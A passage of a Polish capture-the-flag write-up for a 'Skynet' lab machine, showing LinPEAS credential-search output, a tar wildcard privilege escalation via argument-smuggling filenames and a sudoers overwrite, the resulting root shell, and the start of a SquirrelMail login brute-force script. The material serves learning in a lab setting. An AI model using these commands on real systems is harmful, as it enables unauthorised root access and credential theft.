/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/pastetext.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/pasteword.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/example.html
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/jscripts
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/jscripts/embed.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/preview/preview.html
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/print
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/print/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/print/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/save
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/save/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/save/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/css/searchreplace.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/js/searchreplace.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/searchreplace/searchreplace.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/css/content.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/spellchecker/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/css/props.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/js/props.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/style/props.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/tabfocus
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/tabfocus/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/tabfocus/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/cell.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/css/cell.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/css/row.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/css/table.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js/cell.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js/merge_cells.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js/row.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/js/table.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/merge_cells.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/row.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/table/table.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/blank.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/css/template.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/js/template.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/template/template.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/visualchars
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/visualchars/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/visualchars/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/wordcount
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/wordcount/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/wordcount/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/abbr.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/acronym.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/attributes.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/cite.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/css/attributes.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/css/popup.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/del.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/ins.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/abbr.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/acronym.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/attributes.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/cite.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/del.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/element_common.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/js/ins.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/xhtmlxtras/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/about.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/anchor.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/charmap.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/color_picker.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/editor_template.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/editor_template_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/image.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/about.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/anchor.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/charmap.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/color_picker.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/image.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/link.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/js/source_editor.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/langs/en.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/link.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/shortcuts.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default/content.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default/dialog.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/default/ui.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/highcontrast
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/highcontrast/content.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/highcontrast/dialog.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/highcontrast/ui.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/content.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/dialog.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/ui.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/ui_black.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/skins/o2k7/ui_silver.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/advanced/source_editor.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/editor_template.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/editor_template_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/langs/en.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/default
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/default/content.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/default/ui.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/o2k7
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/o2k7/content.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/o2k7/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/simple/skins/o2k7/ui.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce_popup.js
/var/www/html/45kra24zxs28v3yd/administ/tmp/linpeas.sh
/dev/mqueue/linpeas.txt
/var/lib/squirrelmail/data
/var/spool/squirrelmail/attach

[+] Searching passwords in config PHP files
                                                                                                                    
[+] Finding IPs inside logs (limit 100)
    243 /var/log/dpkg.log:0.16.04.1                                                                                 
    161 /var/log/dpkg.log:0.16.04.18
     95 /var/log/dpkg.log:0.16.04.21
     72 /var/log/dpkg.log:1.16.04.1
     62 /var/log/dpkg.log:0.16.04.2
     47 /var/log/dpkg.log:0.16.04.3
     39 /var/log/dpkg.log:4.4.0.142
     25 /var/log/apt/history.log:0.16.04.1
     22 /var/log/apt/history.log:0.16.04.18
     21 /var/log/dpkg.log:4.4.0.161
     17 /var/log/dpkg.log:0.96.20.8
     16 /var/log/dpkg.log:0.16.04.5
     15 /var/log/dpkg.log:3.16.04.4
     14 /var/log/dpkg.log:1.16.04.4
     12 /var/log/dpkg.log:1.16.04.5
     11 /var/log/dpkg.log:6.16.04.1
     11 /var/log/apt/history.log:0.16.04.21
      9 /var/log/dpkg.log:2.16.04.2
      9 /var/log/apt/history.log:1.16.04.1
      8 /var/log/dpkg.log:2.16.04.3
      8 /var/log/dpkg.log:0.16.04.6
      8 /var/log/apt/history.log:0.16.04.2
      7 /var/log/dpkg.log:0.16.04.4
      7 /var/log/apt/history.log:0.16.04.3
      6 /var/log/wtmp:192.168.1.147
      6 /var/log/apt/history.log:4.4.0.142
      5 /var/log/installer/status:1.16.04.1
      4 /var/log/wtmp:10.10.25.215
      4 /var/log/installer/status:1.2.3.3
      4 /var/log/installer/status:0.16.04.1
      3 /var/log/apt/history.log:4.4.0.161
      2 /var/log/bootstrap.log:0.99.7.1
      2 /var/log/apt/history.log:1.16.04.4
      2 /var/log/apt/history.log:0.96.20.8
      2 /var/log/apt/history.log:0.16.04.5
      1 /var/log/lastlog:192.168.1.147
      1 /var/log/lastlog:10.10.25.215
      1 /var/log/installer/status:2.21.63.9
      1 /var/log/bootstrap.log:0.5.5.1
      1 /var/log/apt/history.log:6.16.04.1
      1 /var/log/apt/history.log:3.16.04.4
      1 /var/log/apt/history.log:2.16.04.3
      1 /var/log/apt/history.log:2.16.04.2
      1 /var/log/apt/history.log:1.16.04.5
      1 /var/log/apt/history.log:0.16.04.6
      1 /var/log/apt/history.log:0.16.04.4

[+] Finding passwords inside logs (limit 100)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:                                             
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...
/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/dpkg.log:2019-02-26 23:58:11 configure base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 install base-passwd:amd64 <none> 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:13 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:13 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:13 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:13 upgrade base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:19 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:19 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:19 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:22 configure base-passwd:amd64 3.5.39 <none>
/var/log/dpkg.log:2019-02-26 23:58:22 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:22 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:22 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:28 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
/var/log/dpkg.log:2019-02-26 23:58:28 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:28 status installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:28 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:59:08 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:59:08 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:59:08 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:59:08 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2019-02-26 23:59:08 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2019-02-26 23:59:09 configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
/var/log/dpkg.log:2019-02-26 23:59:09 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2019-02-26 23:59:09 status installed passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2019-02-26 23:59:09 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 100)
      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com                                                                 
     17 /var/log/installer/status:kernel-team@lists.ubuntu.com
     58 /var/log/installer/status:ubuntu-devel-discuss@lists.ubuntu.com
     28 /var/log/installer/status:ubuntu-installer@lists.ubuntu.com

[+] Finding *password* or *credential* files in home
                                                                                                                    
[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords                                                                                                      
/home/milesdyson/backups/backup.tgz                                                                                 
/home/milesdyson/share/Convolutional Neural Networks-CNN.pdf
/home/milesdyson/share/Improving Deep Neural Networks.pdf
/home/milesdyson/share/Natural Language Processing-Building Sequence Models.pdf
/home/milesdyson/share/Structuring your Machine Learning Project.pdf
/var/www/html/45kra24zxs28v3yd/administrator/Configuration.php
/var/www/html/45kra24zxs28v3yd/administrator/classes/DataBase.php
/var/www/html/45kra24zxs28v3yd/administrator/classes/User.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_general_config/index.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Text.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/Text.php
/var/www/html/45kra24zxs28v3yd/administrator/index.php
/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.js
/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.validate.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/tiny_mce_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/uploadify/jquery.js
/var/www/html/45kra24zxs28v3yd/administrator/templates/default/css/template.css
/var/www/html/45kra24zxs28v3yd/administrator/templates/default/html/login.php
/var/www/html/45kra24zxs28v3yd/administrator/Configuration.php:         public $password = "password123";
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
/etc/dovecot/conf.d/auth-checkpassword.conf.ext:  args = /usr/bin/checkpassword
/etc/dovecot/conf.d/auth-checkpassword.conf.ext:  driver = checkpassword
/etc/samba/smb.conf:   pam password change = yes
/etc/samba/smb.conf:   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
/etc/samba/smb.conf:   unix password sync = yes
/etc/samba/smb.conf:; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u
/etc/squirrelmail/conf.pl:                print "Now, please specify password for that DN.\n";
/etc/squirrelmail/conf.pl:            $ret = ' (with IMAP username and password)';
/etc/squirrelmail/conf.pl:            $ret = ' (with custom username and password)';
/etc/squirrelmail/conf.pl:            print "Enter password:";
/etc/squirrelmail/conf.pl:            print "If you don't enter any password, current sitewide password will be used.\n";
/etc/squirrelmail/conf.pl:            print "If you enter space, password will be set to empty string.\n";
/etc/squirrelmail/conf.pl:        print "for \"login\" or \"plain\" without knowing a username and password.\n";
/etc/squirrelmail/conf.pl:    print "SMTP authentication uses IMAP username and password by default.\n";
/etc/squirrelmail/conf.pl:    print "Would you like to use other login and password for all SquirrelMail \n";
/etc/squirrelmail/conf.pl:    print "sensitive passwords.\n\n";
/etc/ssh/sshd_config:PermitEmptyPasswords no
``` 

`LinPEAS` wskazał mi plik wraz ze ścieżką do niego `*/1 *   * * *   root    /home/milesdyson/backups/backup.sh`,
 który jest stworzony przez użytkownika `root` i uruchamia się co 1 minutę z jego uprawnieniami. W katalogu pliku za pomocą polecenia `ls -la` widzę, że nie mogę go podmienić lub edytować. Mogę wyłącznie go odczytać. Po odczytaniu pliku `backup.sh` widzę, że on łączy pliki z katalogu `/var/www/html` i łączy je w pliku `backup.tgz`. Do wspomnianego katalogu mogę dodać swój skrypt bashowy i zostanie on wykonany z uprawnieniami `root`. Dokładniej jest to opisane w [tym artykule.](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
```
www-data@skynet:/tmp$ cd /home/milesdyson/backups/
cd /home/milesdyson/backups/
www-data@skynet:/home/milesdyson/backups$ ls -la
ls -la
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Jun 30 10:27 backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

![](/graphic/skynet_linpeas_wektor_ataku.bmp)

Pliki eskalujące uprawnienia ([GTFOBin](https://gtfobins.github.io/gtfobins/tar/) aplikacja opisująca możliwości różne wektory eskalacji uprawnień):
```
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > shell.sh
```
W katalogu `/var/www/html` tworzę pliki, które pomogą mi uzyskać uprawnienia `root`. Wykonuję polecenia w owym katalogu.

```
www-data@skynet:/home/milesdyson/backups$ cd /var/www/html
cd /var/www/html
www-data@skynet:/var/www/html$ date
date
Fri Jun 30 11:00:25 CDT 2023
www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint-action=exec=sh shell.sh"
www-data@skynet:/var/www/html$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
www-data@skynet:/var/www/html$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > shell.sh
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > shell.sh
www-data@skynet:/var/www/html$ ls
ls
--checkpoint-action=exec=sh shell.sh  admin   css         js
--checkpoint=1                        ai      image.png   shell.sh
45kra24zxs28v3yd                      config  index.html  style.css
```
Po wykonaniu polecenia `sudo su` mam uprawnienia `root` bez podawania hasła.
```
www-data@skynet: sudo su
sudo su
root@skynet:/home/milesdyson/backups# id
id
uid=0(root) gid=0(root) groups=0(root)
root@skynet:/home/milesdyson/backups# cd /
cd /
root@skynet:/# ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
root@skynet:/# cd root
cd root
root@skynet:~# ls
ls
root.txt
root@skynet:~# cat root.txt
cat root.txt
3f0372db24753accc7179a282cd6a949 
```
## Bonus:
Ponieważ `Burp` w wersji `community` korzystając z większego słownika nie miałby sensu, postanowiłem wrócić do tego zadania i spróbować wykorzystać narzędzie, które nie ma podobnych ograniczeń w wersji darmowej. Znalazłem nietypową propozycję na wykonanie tego ataku. Znalazłem bardzo ciekawe podejście do tego problemu w tym filmiku na [YT](https://www.youtube.com/watch?v=HXikLrFVIXc). Przedział czasowy, w którym jest to omawiane to 12:08 - 16:50.

1. W naszej przeglądarce otwieramy narzędzia deweloperskie i tam przechodzimy do zakładki `Network`, następnie logujemy się jakimiś poświadczeniami (niestety ta metoda zakłada, podobnie jak poprzednia, że znamy nazwe użytkownika). Powinniśmy uzyskać plik z rozszerzeniem`.php`.

![](/graphic/skynet_bonus1.bmp)

2. Przyciskając prawym przyciskiem myszy na plik `.php` kopiuję go do `uCURL`.

![](/graphic/skynet_bonus2.bmp)

3. W przeglądarce wyszukuję aplikacji, która zamieni ucurl na kod python. W moim przypadku była to [curlconverter.com](https://curlconverter.com/).

![](/graphic/skynet_bonus3.bmp)

4. Kopiuję kod pythonowy do edytora tekstu/kodu i przerabiam go zgodnie z opisem na wideo.

![](/graphic/skynet_bonus4.bmp)

```
#!/usr/bin/env python3

from pprint import pprint
import requests

cookies = {
    'squirrelmail_language': 'en_US',
